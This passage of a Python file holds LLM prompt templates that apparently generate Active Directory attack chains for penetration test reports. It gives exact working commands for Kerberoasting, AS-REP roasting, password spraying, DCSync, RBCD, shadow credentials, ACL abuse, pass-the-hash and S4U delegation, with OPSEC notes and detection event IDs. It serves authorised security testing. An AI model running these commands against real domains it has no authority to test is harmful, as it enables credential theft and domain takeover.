- impacket-psexec uses SMB (port 445) — requires local Administrators group membership

**Rule of thumb:** If you just cracked a service account password (Kerberoasting/AS-REP), use evil-winrm.
If you have domain admin or a known local admin account, impacket-wmiexec or impacket-psexec are valid choices.

**NEVER use impacket-smbclient as a final authentication/shell step.** smbclient only gives file share access, NOT a shell. It is NOT equivalent to evil-winrm, impacket-wmiexec, or impacket-psexec. Only use smbclient for share enumeration, never as the final "prove access" step.

**evil-winrm Kerberos authentication syntax:**
- evil-winrm does NOT have `-K` or `-t` flags — these do not exist
- For Kerberos auth, set the ccache via environment variable FIRST, then use `-r` for the realm:
  ✅ CORRECT: `export KRB5CCNAME=Administrator@cifs_DC.DOMAIN.COM@DOMAIN.COM.ccache && evil-winrm -i DC.DOMAIN.COM -u Administrator -r DOMAIN.COM`
  ❌ WRONG: `evil-winrm -i DC.DOMAIN.COM -u Administrator -K -t Administrator.ccache`
  ❌ WRONG: `evil-winrm -i DC.DOMAIN.COM -u Administrator --kerberos --ccache Administrator.ccache`

## NO HASH EXTRACTION STEPS:
- impacket-secretsdump prints hashes directly to the terminal — the operator copies the hash from the output
- Do NOT generate a separate "Extract Hash" or "Format Hash" step with grep, cut, python3, or regex parsing
- Do NOT generate python3 one-liners to parse secretsdump output
- The step after DCSync should be "Authenticate as Administrator" using the hash, NOT "Extract the hash"
- ❌ WRONG: `grep '^Administrator:' dcsync_output.txt | cut -d: -f4`
- ❌ WRONG: `python3 -c "import re; ..."` to parse hash output
- ✅ CORRECT: Go directly from DCSync to `evil-winrm -i DC -u Administrator -H <NT_HASH>`

## GROUP SOURCE AUTHENTICATION RULE (CRITICAL):
- You CANNOT authenticate as a GROUP — groups are not accounts and have no credentials
- If the source of a finding is a group name (e.g., "EXCHANGE WINDOWS PERMISSIONS", "SHARED SUPPORT ACCOUNTS"), do NOT put the group name in authentication strings
- Instead, tell the operator to enumerate the group's members first and authenticate as one of them
- Example: "The group SHARED SUPPORT ACCOUNTS has GenericAll over DC. Enumerate its members and authenticate as one of them."

## kerbrute SYNTAX RULES:
- kerbrute uses `--dc` for the domain controller, NOT `--dc-ip`
  ✅ CORRECT: `kerbrute passwordspray --dc DC.DOMAIN.COM -d DOMAIN.COM users.txt 'Password123!'`
  ❌ WRONG: `kerbrute passwordspray --dc-ip DC.DOMAIN.COM -d DOMAIN.COM users.txt 'Password123!'`

## nxc (NetExec) PASSWORD SYNTAX RULES:
- The `-p` flag accepts ONE password OR a file path — NOT a comma-separated list
- For multiple passwords, create a file with one password per line and pass the file path
  ✅ CORRECT: `nxc smb DC.DOMAIN.COM -u users.txt -p passwords.txt --continue-on-success`
  ✅ CORRECT: `nxc smb DC.DOMAIN.COM -u USERNAME -p 'SinglePassword!'`
  ❌ WRONG: `nxc smb DC.DOMAIN.COM -u USERNAME -p 'Pass1!,Pass2!,Pass3!'` (comma-separated list is NOT valid)

## bloodyAD SYNTAX RULES (CRITICAL — incorrect syntax breaks commands):
- Use DOUBLE dashes for flags: `--attr` NOT `-attr`, `--host` NOT `-host`
- Domain objects require Distinguished Name format: `'DC=DOMAIN,DC=TLD'` NOT `'DOMAIN.TLD'`
  Example: `bloodyAD ... get object 'DC=PUPPY,DC=HTB' --attr nTSecurityDescriptor`
  WRONG: `bloodyAD ... get object 'PUPPY.HTB' -attr nTSecurityDescriptor`
- User/group objects use sAMAccountName: `bloodyAD ... set password 'VICTIM' 'NewPass!'`
- ❌ `bloodyAD set rbcd` DOES NOT EXIST — bloodyAD cannot configure RBCD delegation
- For RBCD, ONLY use `impacket-rbcd` — this is the correct tool for writing msDS-AllowedToActOnBehalfOfOtherIdentity

## TECHNIQUE BLEEDING PREVENTION (CRITICAL)
Only include techniques that match the edge types in this finding:
- DCSync/Golden Ticket/krbtgt → ONLY if edges include GetChanges, GetChangesAll, or DCSync
- Kerberoasting → ONLY if edges include Kerberoastable, HasSPNConfigured, or source has SPN
- AS-REP Roasting → ONLY if edges include ASREPRoastable or DontReqPreAuth
- Shadow Credentials → ONLY if edges include AddKeyCredentialLink or GenericWrite on user
- RBCD → ONLY if edges include AllowedToAct, AddAllowedToAct, or GenericWrite on computer

If the edges are only MemberOf, WriteDacl, WriteOwner, GenericAll, or AddMember:
- Focus on ACL abuse, group manipulation, or permission exploitation
- Do NOT mention DCSync, Golden Ticket, or krbtgt unless explicitly in the edge list
- The final step should be lateral movement or privilege use, NOT domain credential dumping

## STEP SEQUENCING RULES (Fix 4 - CRITICAL)
Step 1 MUST be an initial access or enumeration step. HIGH-PRIVILEGE COMMANDS CANNOT BE STEP 1:

**FORBIDDEN as Step 1 (require credentials from prior steps):**
- impacket-secretsdump / DCSync - requires GetChanges rights on an account you've compromised
- mimikatz lsadump::dcsync - same as above
- impacket-psexec / impacket-wmiexec / evil-winrm - require obtained credentials/hashes
- Golden Ticket creation - requires krbtgt hash from DCSync
- sekurlsa::logonpasswords - requires admin access on target

**VALID as Step 1 (enumeration or credential access from low privilege):**
- Kerberoasting (impacket-GetUserSPNs, Rubeus kerberoast) - obtains hashes from low priv
- AS-REP Roasting (impacket-GetNPUsers, Rubeus asreproast) - works without creds
- LDAP enumeration (ldapsearch, Get-ADUser, Get-DomainUser)
- ACL enumeration and abuse setup
- Password reset (if you have ForceChangePassword right)

**Correct flow example:**
1. ✅ Kerberoast service account → obtain hash
2. ✅ Crack hash offline → obtain password
3. ✅ Use credentials to access target → psexec/evil-winrm
4. ✅ DCSync if account has replication rights

**WRONG flow (DO NOT DO THIS):**
1. ❌ DCSync to dump hashes ← How? You don't have creds yet!

## TOOL ACCURACY RULES (Fix 5 - CRITICAL)
USE ONLY REAL TOOLS. The following tools DO NOT EXIST - never reference them:

**NON-EXISTENT Impacket Scripts (DO NOT USE):**
- ❌ dcsync.py, dvcsync.py, replication.py → USE: impacket-secretsdump
- ❌ kerberoast.py, kerberoaster.py → USE: impacket-GetUserSPNs
- ❌ asreproast.py, asreproaster.py, GetNPUsers.py → USE: impacket-GetNPUsers
- ❌ golden.py, goldenticket.py → USE: impacket-ticketer
- ❌ silver.py, silverticket.py → USE: impacket-ticketer
- ❌ pth.py, passthehash.py → USE: impacket-psexec -hashes or impacket-wmiexec -hashes
- ❌ dacl.py → USE: dacledit.py
- ❌ owner.py → USE: owneredit.py

**DEPRECATED Tools (DO NOT USE):**
- ❌ crackmapexec, cme → USE: nxc (NetExec)

**CORRECT Impacket Tool Names:**
- impacket-secretsdump (DCSync, SAM dump, LSA secrets)
- impacket-GetUserSPNs (Kerberoasting)
- impacket-GetNPUsers (AS-REP Roasting)
- impacket-ticketer (Golden/Silver ticket creation)
- impacket-psexec, impacket-wmiexec, impacket-smbexec, impacket-atexec (Remote execution)
- dacledit.py (DACL modification)
- owneredit.py (Owner modification)
- addcomputer.py (Add computer to domain)
- rbcd.py (Resource-Based Constrained Delegation)

**CORRECT Tool Casing:**
- bloodyAD (not BloodyAD, Bloodyad, BLOODYAD)
- Certipy (not certipy.py - it's just 'certipy')
- Certify.exe (C# tool, not Python)
- Rubeus.exe (C# tool)
- SharpHound.exe (collector, not BloodHound.exe)"""


# =============================================================================
# KERBEROASTING PROMPT
# For: Kerberoastable, HasSPNConfigured edges
# =============================================================================
KERBEROAST_PROMPT = """You are generating a **Kerberoasting** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: KERBEROASTING
Kerberoasting exploits service accounts with Service Principal Names (SPNs). You request a
Kerberos TGS ticket encrypted with the service account's password hash, then crack it offline.
This is a **CREDENTIAL ACCESS** attack - you are OBTAINING credentials, not using existing ones.

## ATTACK FLOW (Follow this sequence)
1. **Enumerate** - Identify the target SPN (already done by AEGIS, but show verification)
2. **Request TGS** - Request service ticket for the target SPN
3. **Extract Hash** - Extract the Kerberos hash from the ticket
4. **Crack Offline** - Crack the hash on your attacker machine (OPSEC-SAFE - no network traffic)
5. **Authenticate** - Use recovered credentials to access resources

## EXACT COMMAND SYNTAX (COPY THESE — do NOT invent flags)
**SAFE - Enumerate Kerberoastable accounts:**
```bash
# Enumerate SPNs without requesting tickets — blends with normal LDAP queries
$ impacket-GetUserSPNs -dc-ip {dc_hostname} {domain}/lowpriv:'<PASSWORD>'
```

**SAFE - Request TGS ticket and extract hash:**
```bash
# Request tickets for cracking — uses the -request flag
$ impacket-GetUserSPNs -dc-ip {dc_hostname} {domain}/lowpriv:'<PASSWORD>' -request -outputfile kerberoast_hashes.txt
```

**SAFE - Crack TGS hash offline (no network traffic):**
```bash
$ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Authenticate with cracked password:**
```bash
$ evil-winrm -i {dc_hostname} -u '{target}' -p '<PASSWORD>'
```

⚠️ **impacket-GetUserSPNs SYNTAX RULES:**
- Auth string format: `DOMAIN/user:'password'` (NOT `-u user -p pass`)
- ❌ WRONG: `impacket-GetUserSPNs -user USERNAME -dc-ip DC` (no -user flag)
- ✅ CORRECT: `impacket-GetUserSPNs -dc-ip DC DOMAIN/user:'pass'`
- Use `-request` to actually request tickets (enumeration-only without it)

## CRITICAL RULES FOR THIS ATTACK
1. This attack **OBTAINS** credentials - do NOT assume they already exist
2. Do NOT mention DCSync, Golden Ticket, or ADCS - these are DIFFERENT attack paths
3. The cracking step is **OFFLINE** - emphasize this is OPSEC-SAFE
4. Service accounts often have weak passwords - this is why the attack works
5. Step 1 MUST show how to get initial domain access to request tickets
6. For the authentication step, use **evil-winrm** (NOT wmiexec/psexec) — cracked service accounts typically have Remote Management Users membership but NOT local admin rights
7. Use the EXACT command syntax shown above — do NOT invent or guess Impacket flags

## FORBIDDEN TECHNIQUES (MANDATORY - NEVER INCLUDE THESE)
❌ DCSync / secretsdump - requires GetChanges rights, NOT part of Kerberoasting
❌ Golden Ticket / krbtgt - NOT part of Kerberoasting attack path
❌ Any "persistence" step involving krbtgt or domain-wide credential dumping
❌ Certificate attacks / PKINIT - different attack path
❌ RBCD / S4U attacks - delegation abuse, not Kerberoasting

## FINAL STEP REQUIREMENT
The LAST step MUST be "Authentication & Access" showing how to USE the cracked credentials.
Do NOT add a "Domain Compromise", "Persistence", or "Post-Exploitation" step.
The attack ends when you authenticate with the cracked password.

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering the full Kerberoasting attack path."""


# =============================================================================
# AS-REP ROASTING PROMPT
# For: ASREPRoastable, DontReqPreAuth edges
# =============================================================================
ASREP_ROAST_PROMPT = """You are generating an **AS-REP Roasting** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: AS-REP ROASTING
AS-REP Roasting targets accounts with "Do not require Kerberos preauthentication" enabled.
These accounts will respond to AS-REQ requests without proof of identity, returning an
encrypted AS-REP that can be cracked offline. Unlike Kerberoasting, this attack works
**WITHOUT valid domain credentials** - you only need network access.

## ATTACK FLOW (Follow this sequence)
1. **Enumerate** - Find accounts with DONT_REQ_PREAUTH set (can be done unauthenticated)
2. **Request AS-REP** - Send AS-REQ to DC for target account
3. **Extract Hash** - Extract the AS-REP hash (Kerberos type 23)
4. **Crack Offline** - Crack on attacker machine (OPSEC-SAFE - no network traffic)
5. **Authenticate** - Use recovered credentials

## EXACT COMMAND SYNTAX (COPY THESE — do NOT invent flags)
**SAFE - AS-REP hash request (no credentials needed):**
```bash
# Request AS-REP hash for a specific user — username goes AFTER domain/
$ impacket-GetNPUsers {domain}/{target} -no-pass -dc-ip {dc_hostname} -format hashcat
```

**SAFE - Crack AS-REP hash offline (no network traffic):**
```bash
$ hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

**Authenticate with cracked password:**
```bash
$ evil-winrm -i {dc_hostname} -u '{target}' -p '<PASSWORD>'
```

⚠️ **impacket-GetNPUsers SYNTAX RULES:**
- Username goes AFTER the domain slash: `impacket-GetNPUsers DOMAIN/USERNAME`
- ❌ WRONG: `impacket-GetNPUsers DOMAIN/ -user USERNAME` (the -user flag DOES NOT EXIST)
- ❌ WRONG: `impacket-GetNPUsers DOMAIN/ -username USERNAME` (also does not exist)
- ❌ WRONG: `GetNPUsers.py DOMAIN/USERNAME` (old naming — use impacket- prefix)
- ❌ WRONG: `impacket-GetNPUsers DOMAIN/USERNAME$` ($ suffix is for COMPUTER accounts only, never for users)
- ✅ CORRECT: `impacket-GetNPUsers DOMAIN/USERNAME -no-pass -dc-ip DC -format hashcat`

## CRITICAL RULES FOR THIS ATTACK
1. This attack can work **WITHOUT domain credentials** (unlike Kerberoasting)
2. This attack **OBTAINS** credentials - do NOT assume they exist
3. Do NOT mention DCSync, Golden Ticket, Kerberoasting - different attacks
4. The cracking step is **OFFLINE** - emphasize this is OPSEC-SAFE
5. DONT_REQ_PREAUTH is rarely set intentionally - it's usually misconfiguration
6. For the authentication step, use **evil-winrm** (NOT wmiexec/psexec) — cracked accounts typically have Remote Management Users membership but NOT local admin rights
7. Use the EXACT command syntax shown above — do NOT invent or guess Impacket flags

## FORBIDDEN TECHNIQUES
- DCSync / secretsdump (not applicable)
- Kerberoasting (different attack - requires auth and SPNs)
- Certificate attacks (different path)

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering the full AS-REP Roasting attack path."""


# =============================================================================
# DCSYNC PROMPT
# For: DCSync, GetChanges, GetChangesAll, GetChangesInFilteredSet edges
# =============================================================================
DCSYNC_PROMPT = """You are generating a **DCSync** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: DCSYNC
DCSync abuses directory replication privileges (DS-Replication-Get-Changes and
DS-Replication-Get-Changes-All) to request password data from a Domain Controller.
This mimics the behavior of a DC requesting replication, allowing extraction of
ANY user's password hash including the Administrator account.

## ATTACK FLOW (Follow this sequence)
1. **Compromise Source** - Gain access to the principal with DCSync rights
2. **Execute DCSync** - Replicate password hashes from DC
3. **Authenticate as Administrator** - Use the dumped Administrator hash to prove domain compromise

## TOOLS TO USE
- **DCSync Execution**:
  - impacket-secretsdump {domain}/{source}:'<PASSWORD>'@{dc_hostname} -just-dc
  - impacket-secretsdump {domain}/{source}:'<PASSWORD>'@{dc_hostname} -just-dc-user Administrator
  - Mimikatz: lsadump::dcsync /domain:{domain} /user:Administrator

- **Authenticate with Dumped Hash**:
  - impacket-psexec -hashes :<NT_HASH> {domain}/Administrator@{dc_hostname}
  - evil-winrm -i {dc_hostname} -u Administrator -H <NT_HASH>

## CRITICAL RULES FOR THIS ATTACK
1. DCSync = DOMAIN COMPROMISE — this is the endgame. The attack ENDS with DCSync + hash dump.
2. You MUST show how to compromise the principal with DCSync rights first
3. The FINAL step should be authenticating as Administrator using the dumped hash — proving full compromise
4. impacket-secretsdump generates Event 4662 — note this in detection risk

## WHAT NOT TO INCLUDE
❌ Do NOT include Golden Ticket creation — that is a PERSISTENCE technique, not part of this attack finding
❌ Do NOT include krbtgt hash extraction — DCSync dumps Administrator hash which is sufficient
❌ Do NOT include impacket-ticketer or kerberos::golden — these are post-exploitation, not exploitation
❌ Do NOT add "Establish Persistence" or "Create Golden Ticket" as a step
The attack chain ENDS when you dump the Administrator hash and prove you can authenticate with it.

## DETECTION EVENTS
- Event 4662: Operation performed on object (with replication GUIDs)
  - GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
  - GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)
- Event 4624: Logon event for the account performing DCSync

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3 steps: compromise the DCSync principal, execute DCSync to dump hashes, authenticate as Administrator."""


# =============================================================================
# GENERIC ALL / FULL CONTROL PROMPT
# For: GenericAll edges (varies by target type)
# =============================================================================
GENERICALL_PROMPT = """You are generating a **GenericAll (Full Control)** abuse chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GENERICALL ABUSE
GenericAll grants FULL CONTROL over the target object. The abuse technique varies by target type:

**GenericAll on USER:**
- Reset password (instant takeover)
- Targeted Kerberoasting (add SPN, then Kerberoast)
- Shadow Credentials (add msDS-KeyCredentialLink)

**GenericAll on COMPUTER:**
- Resource-Based Constrained Delegation (RBCD)
- Shadow Credentials (add key credential)
- LAPS password read (if LAPS deployed)

**GenericAll on GROUP:**
- Add yourself as member (inherit group privileges)

**GenericAll on DOMAIN:**
- Grant DCSync rights to yourself
- Modify domain-wide policies

## ATTACK FLOW
1. **Compromise Source** - Get access to principal with GenericAll
2. **Identify Target Type** - User, Computer, Group, or Domain
3. **Choose Technique** - Based on target type and stealth requirements
4. **Execute Abuse** - Perform the chosen attack
5. **Leverage Access** - Use gained access for next objective

## TOOLS BY TARGET TYPE

**User Target — MUST show TWO OPSEC options in the exploitation step:**

OPSEC-SAFE Option: Password Reset (instant access, single LDAP command):
  bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host DC set password TARGET 'NewP@ss123!'
  (GenericAll grants direct password reset — no cracking needed, immediate access)

OPSEC-RISKY Option: Targeted Kerberoasting (avoids changing password, but requires cracking):
  bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} set object TARGET servicePrincipalName -v 'HTTP/fake.{domain}'
  impacket-GetUserSPNs {domain}/{source}:'<PASSWORD>' -request -outputfile tgs.txt -dc-ip {dc_hostname}
  hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
  bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} set object TARGET servicePrincipalName -v ''

**Computer Target — RBCD (MANDATORY 4 SEPARATE STEPS — each step MUST be its own numbered attack step with its own OPSEC options. NEVER combine two steps into one.):**
Step 1 — Create Attacker Computer:
  SAFE: `bloodyAD -d {domain} -u SOURCE_USER -p '<PASSWORD>' --host {dc_hostname} add computer 'ATTACKERPC$' '<PASSWORD>'`
  RISKY: `impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass '<PASSWORD>' -dc-ip {dc_hostname} '{domain}/SOURCE_USER:<PASSWORD>'`
Step 2 — Configure RBCD Delegation (impacket-rbcd is the ONLY valid tool — bloodyAD CANNOT do RBCD):
  `impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'ATTACKERPC$' -action 'write' -dc-ip {dc_hostname} '{domain}/SOURCE_USER:<PASSWORD>'`
Step 3 — Request Service Ticket:
  `impacket-getST -spn CIFS/TARGET -impersonate Administrator -dc-ip {dc_hostname} '{domain}/ATTACKERPC$:<PASSWORD>'`
Step 4 — Use Ticket for Access:
  `export KRB5CCNAME=Administrator@cifs_TARGET@{domain}.ccache && impacket-secretsdump -k -no-pass '{domain}/Administrator@TARGET'`
⚠️ Step 1 and Step 2 are DIFFERENT tools — they MUST be separate steps. Do NOT merge them.
⚠️ Step 2 MUST use impacket-rbcd — do NOT use bloodyAD for RBCD configuration, `bloodyAD set rbcd` DOES NOT EXIST.

**Computer Target — Shadow Credentials (alternative):**
- `certipy shadow auto -u '{source}@{domain}' -p '<PASSWORD>' -account 'TARGET$' -target {dc_hostname} -dc-ip {dc_hostname}`

**Group Target:**
- Add Member: bloodyAD add groupMember GROUP ATTACKER

**Domain Target:**
- Grant DCSync: impacket-dacledit -action write -rights DCSync
- Then: impacket-secretsdump

## CRITICAL RULES
1. The technique depends on TARGET TYPE — check what {target} is
2. For users: MUST present Targeted Kerberoasting AND Shadow Credentials AND Password Reset as options
3. For computers: RBCD allows impersonation without touching the target
4. Do NOT mention techniques for wrong target type
5. Shadow Credentials requires LDAPS + PKINIT (AD 2016+) — if it fails, fall back to Kerberoasting
6. **AUTHENTICATION STRINGS MUST USE A USER ACCOUNT, NEVER A GROUP NAME.** If the source ({source}) is a GROUP (e.g., "SHARED SUPPORT ACCOUNTS", "EXCHANGE WINDOWS PERMISSIONS"), you CANNOT authenticate as a group. Instead, instruct the operator: "Authenticate as a member of {source} — enumerate group members first, then use one of their credentials." Show the enumeration step: `nxc ldap {dc_hostname} -u USER -p PASS --groups '{source}'` to list members, then use an individual member's credentials in subsequent commands.

## TECHNIQUE RESTRICTIONS (MANDATORY - CRITICAL)
Check {target} and apply these rules STRICTLY:
- **If target is USER (e.g., ADMINISTRATOR, JSMITH)**:
  ❌ FORBIDDEN: DCSync, Golden Ticket, secretsdump, krbtgt, "Establish Persistent Access"
  ✅ ALLOWED: Password reset, targeted Kerberoast, shadow credentials, then USE the access
- **If target is GROUP (e.g., DOMAIN ADMINS)**:
  ❌ FORBIDDEN: DCSync, Golden Ticket, secretsdump, krbtgt
  ✅ ALLOWED: Add member, then USE the new group privileges
- **If target is COMPUTER**:
  ❌ FORBIDDEN: DCSync, Golden Ticket
  ✅ ALLOWED: RBCD, Shadow Credentials, LAPS read
- **ONLY if target is the DOMAIN object itself (e.g., ACTIVE.HTB domain)**:
  ✅ DCSync is appropriate

## FINAL STEP REQUIREMENT
The LAST step MUST be "Access Resources" or "Leverage Access" - showing practical USE of gained privileges.
❌ Do NOT add a "Persistence", "Domain Compromise", or "Post-Exploitation" step
❌ Do NOT suggest Golden Ticket or krbtgt extraction as a final step
The attack ends when you demonstrate USING the compromised access.

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering GenericAll abuse appropriate to the target type. End with accessing resources."""


# =============================================================================
# GENERIC WRITE PROMPT
# For: GenericWrite edges
# =============================================================================
GENERICWRITE_PROMPT = """You are generating a **GenericWrite** abuse chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GENERICWRITE ABUSE
GenericWrite allows modification of non-protected attributes. Key abusable attributes:
- **servicePrincipalName** - Add SPN for targeted Kerberoasting
- **msDS-KeyCredentialLink** - Add shadow credentials for PKINIT auth
- **scriptPath** - Set malicious logon script
- **msDS-AllowedToActOnBehalfOfOtherIdentity** - Configure RBCD (on computers)

## ATTACK TECHNIQUES
1. **Targeted Kerberoasting** (Most common)
   - Add fake SPN to user account
   - Request TGS ticket for that SPN
   - Crack offline to get password
   - Remove SPN to clean up

2. **Shadow Credentials** (Stealthier, requires AD 2016+)
   - Add key credential to target
   - Use certificate to request TGT
   - No password modification required

3. **Logon Script Injection** (If targeting user object)
   - Set scriptPath to attacker-controlled share
   - Script executes on user's next logon

## EXPLOITATION STEP STRUCTURE (MANDATORY)
When the GenericWrite is on a USER target, the exploitation step MUST present BOTH techniques
as OPSEC options within the SAME step. Do NOT pick just one — show both:

**OPSEC-SAFE Option: Targeted Kerberoasting** (works even if LDAPS/PKINIT is broken):
```bash
# Set fake SPN on target
bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} set object {target} servicePrincipalName -v 'HTTP/fake.{domain}'
# Request TGS ticket
impacket-GetUserSPNs {domain}/{source}:'<PASSWORD>' -request -outputfile tgs.txt -dc-ip {dc_hostname}
# Crack offline
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
# Cleanup: remove fake SPN
bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} set object {target} servicePrincipalName
```

**OPSEC-RISKY Option: Shadow Credentials** (stealthier, requires LDAPS + PKINIT):
```bash
# Add shadow credential to target
certipy shadow auto -u {source}@{domain} -p '<PASSWORD>' -account {target} -target {dc_hostname} -dc-ip {dc_hostname}
# Output: NT hash for target user (or .pfx certificate)
# If SSL error occurs, fall back to Targeted Kerberoasting above
```

## WHY BOTH OPTIONS MATTER
- Shadow Credentials fails if LDAPS is misconfigured (SSL wrapping error) or PKINIT not supported
- Targeted Kerberoasting works on ANY environment but requires the target to have a weak/crackable password
- A real pentester tries Shadow Credentials first, falls back to Targeted Kerberoasting if it fails

## CRITICAL RULES
1. GenericWrite is LIMITED — you can't reset passwords directly
2. ALWAYS present BOTH Targeted Kerberoasting AND Shadow Credentials as options
3. Do NOT mention DCSync, GenericAll techniques — different permissions
4. Shadow Credentials requires LDAPS + PKINIT (AD 2016+) — note this in the option

## TECHNIQUE RESTRICTIONS (MANDATORY)
❌ Do NOT include DCSync, Golden Ticket, secretsdump, or krbtgt in this attack chain
❌ GenericWrite does NOT lead directly to domain compromise
✅ Final step: Use stolen credentials for lateral movement or resource access
✅ Present BOTH: Targeted Kerberoasting AND Shadow Credentials as OPSEC options

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps. The exploitation step MUST show both Targeted Kerberoasting (SAFE) and Shadow Credentials (RISKY) as OPSEC options."""


# =============================================================================
# WRITEDACL / WRITEOWNER PROMPT
# For: WriteDacl, WriteOwner, Owns edges
# =============================================================================
WRITEDACL_PROMPT = """You are generating a **WriteDacl/WriteOwner** abuse chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: ACL MANIPULATION
- **WriteDacl**: Modify the target's DACL to grant yourself FullControl, then exploit
- **WriteOwner**: Take ownership first (impacket-owneredit), then modify DACL (impacket-dacledit)
- **Owns**: Already owner — modify DACL directly (impacket-dacledit)

These are STEPPING STONE attacks — you grant yourself stronger permissions, then exploit those.

## ATTACK FLOW (Based on Target Type)

**If target is a USER:**
Step 1: Grant yourself FullControl on the user
  SAFE: $ impacket-dacledit -action write -rights FullControl -principal '{source}' -target '{target}' '{domain}/{source}:<PASSWORD>' -dc-ip {dc_hostname}
Step 2: Reset the user's password (now you have FullControl)
  SAFE: $ bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} set password '{target}' 'NewP@ss123!'
Step 3: Authenticate as the user and access resources
  RISKY: $ evil-winrm -i {dc_hostname} -u '{target}' -p 'NewP@ss123!'

**If target is a GROUP:**
Step 1: Grant yourself AddMember on the group
  SAFE: $ impacket-dacledit -action write -rights FullControl -principal '{source}' -target '{target}' '{domain}/{source}:<PASSWORD>' -dc-ip {dc_hostname}
Step 2: Add yourself to the group
  SAFE: $ bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host {dc_hostname} add groupMember '{target}' '{source}'
Step 3: Use the group's privileges

**If target is DOMAIN object:**
Step 1: Grant yourself DCSync rights on the domain
  SAFE: $ impacket-dacledit -action write -rights DCSync -principal '{source}' -target '{target}' '{domain}/{source}:<PASSWORD>' -dc-ip {dc_hostname}
Step 2: Perform DCSync to dump all domain hashes
  RISKY: $ impacket-secretsdump '{domain}/{source}:<PASSWORD>'@{dc_hostname}
Step 3: Authenticate as Administrator
  RISKY: $ impacket-psexec -hashes :<NT_HASH> '{domain}/Administrator@{dc_hostname}'

**If WriteOwner — add this step BEFORE the above:**
Step 0: Take ownership first
  SAFE: $ impacket-owneredit -action write -new-owner '{source}' -target '{target}' '{domain}/{source}:<PASSWORD>' -dc-ip {dc_hostname}

## CRITICAL RULES
1. WriteDacl/WriteOwner are STEPPING STONES — always grant FullControl or DCSync first, THEN exploit
2. For DOMAIN targets: grant DCSync rights, then use impacket-secretsdump — this IS the correct final step
3. For USER targets: grant FullControl, then reset password — simplest path
4. For GROUP targets: grant FullControl, then add self to group
5. WriteOwner requires an EXTRA step: take ownership BEFORE modifying DACL
6. ACL changes generate Event 4670/5136 — note detection risk

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps. Match the attack flow to the TARGET TYPE shown above."""


# =============================================================================
# CONSTRAINED DELEGATION (S4U) PROMPT
# For: AllowedToDelegate edges
# =============================================================================
CONSTRAINED_DELEGATION_PROMPT = """You are generating a **Constrained Delegation (S4U)** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: CONSTRAINED DELEGATION ABUSE
Constrained Delegation allows a service to impersonate users to SPECIFIC services.
The msDS-AllowedToDelegateTo attribute lists allowed target SPNs. Using S4U2Self
and S4U2Proxy protocol extensions, an attacker can request tickets as ANY user
(including Administrator) to the allowed services.

## ATTACK FLOW
1. **Compromise Delegated Principal** - Get control of account with delegation rights
2. **Enumerate Targets** - Check msDS-AllowedToDelegateTo for allowed SPNs
3. **Request S4U2Self Ticket** - Get ticket for target user to yourself
4. **Request S4U2Proxy Ticket** - Get ticket to allowed service as target user
5. **Access Service** - Use forged ticket to access target service

## TOOLS TO USE
- **Delegation Enumeration**:
  - Get-DomainUser -TrustedToAuth (PowerView)
  - Get-DomainComputer -TrustedToAuth
  - ldapsearch msDS-AllowedToDelegateTo
- **S4U Attack**:
  - Rubeus s4u /user:SOURCE /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET /ptt
  - getST.py -spn cifs/TARGET -impersonate Administrator DOMAIN/SOURCE:password
- **Alternative Service**:
  - Rubeus s4u /altservice:ldap,host,http (service name is just a label)

## ALTERNATIVE SERVICE TRICK
SPNs in AD are just labels - if you have a ticket for cifs/target, you can
request the same ticket for ldap/target, http/target, etc. using /altservice.
This expands your access significantly.

## CRITICAL RULES
1. You need the delegated account's credentials (password or hash)
2. The IMPERSONATED user must NOT be marked "sensitive and cannot be delegated"
3. Built-in Administrator (RID 500) CAN always be impersonated
4. Do NOT mention DCSync unless target SPN allows DC access (ldap/DC)

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering S4U delegation abuse."""


# =============================================================================
# RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) PROMPT
# For: AllowedToAct, GenericAll/GenericWrite on Computer edges
# =============================================================================
RBCD_PROMPT = """You are generating a **Resource-Based Constrained Delegation (RBCD)** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: RBCD ATTACK
RBCD flips the delegation model - instead of configuring WHO can delegate,
you configure which accounts can IMPERSONATE to a resource. The
msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the TARGET computer
specifies who can delegate to it.

If you can WRITE to this attribute (via GenericAll, GenericWrite, or WriteProperty),
